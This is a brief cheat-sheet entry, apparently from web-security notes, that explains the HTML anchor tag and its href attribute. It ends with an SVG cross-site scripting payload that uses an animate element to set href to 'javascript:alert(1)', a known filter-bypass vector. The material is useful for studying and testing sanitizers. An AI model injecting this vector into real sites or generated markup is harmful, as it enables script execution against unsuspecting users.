
---
anchor : Creates a hyperlink to other web pages,files, locations in the same page, email addresses, or any URL.

```html
<a>...</a>
```

href : hyperlink reference

```html
<a href="https://example.com">Click</a>
```

animate an change the attribute of the tag dynamically. 

```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click Me</text></a></svg>
```

`values` as an attribute, it won't execute javascript automatically, so we have to specify it.